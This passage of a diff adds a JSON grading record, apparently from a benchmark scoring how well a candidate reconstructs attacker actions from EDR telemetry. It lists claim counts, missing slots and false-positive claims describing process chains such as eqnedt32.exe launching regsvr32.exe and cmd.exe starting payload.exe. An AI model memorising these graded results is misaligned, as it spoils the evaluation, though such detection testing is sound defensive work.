+      "cmd.exe → payload.exe 起動（重複主張）"
+    ],
+    "notes_ja": [
+      "クリティカルエビデンスとして要求されるCBC EDRテレメトリ行が提示されていないため、evidence採点は全て0。"
+    ]
+  },
+  "candidate_action_claim_count": "13",
+  "candidate_action_claim_slot_count": "44",
+  "candidate_action_claim_true_positive_slot_count": "9",
+  "hallucinated_claim_count": "3",
+  "unsupported_evidence_count": "0",
+  "contradicted_evidence_count": "0",
+  "nearby_action_fp_count": "5",
+  "main_missing_items": [
+    "s3_pt_04_powershell_mid_chain:S3-08-S02:subject",
+    "s3_pt_04_powershell_mid_chain:S3-08-S02:operation",
+    "s3_pt_04_powershell_mid_chain:S3-08-S02:object",
+    "s3_pt_04_powershell_mid_chain:S3-08-S03:subject",
+    "s3_pt_04_powershell_mid_chain:S3-08-S03:operation",
+    "s3_pt_04_powershell_mid_chain:S3-08-S03:object",
+    "s3_pt_04_powershell_mid_chain:S3-08-S06:subject",
+    "s3_pt_04_powershell_mid_chain:S3-08-S06:operation",
+    "s3_pt_04_powershell_mid_chain:S3-08-S06:object",
+    "s3_pt_04_powershell_mid_chain:S3-08-S07:subject",
+    "s3_pt_04_powershell_mid_chain:S3-08-S07:operation",
+    "s3_pt_04_powershell_mid_chain:S3-08-S07:object"
+  ],
+  "main_false_positive_claims": [
+    "eqnedt32.exe（PID 2244）がregsvr32.exe（PID 3992）を起動",
+    "regsvr32.exe（PID 3992）が外部URLからスクリプトをロード",
+    "powershell.exe (PID 2340) が powershell.exe を起動した",
+    "cmd.exe (PID 1880) が cmd.exe を起動した",
+    "payload.exe (PID 3208) が payload.exe を起動した",
+    "payload.exe（PID 3208）が一時フォルダ内ファイルに書き込み（3件）",
+    "powershell.exe → cmd.exe 起動（重複）",
+    "cmd.exe → payload.exe 起動（重複）"
+  ]
+}
